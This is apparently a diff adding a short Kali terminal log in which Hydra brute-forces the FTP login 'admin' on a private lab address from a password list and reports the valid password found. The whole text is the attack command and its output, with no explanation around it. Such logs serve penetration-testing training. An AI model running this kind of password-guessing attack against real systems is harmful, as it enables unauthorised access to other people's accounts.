@@ -1,0 +1,7 @@
+kali@kali:~$ hydra -l admin -P passwords.txt ftp://192.168.1.10
+Hydra v9.2 (c) 2021 by van Hauser / THC - Please do not use in military or secret service organizations
+[DATA] max 4 tasks per 1 server, 12 login tries
+[ATTEMPT] target 192.168.1.10 - login "admin" - pass "123456" - 1 of 12
+[ATTEMPT] target 192.168.1.10 - login "admin" - pass "password" - 2 of 12
+[21][ftp] host: 192.168.1.10   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
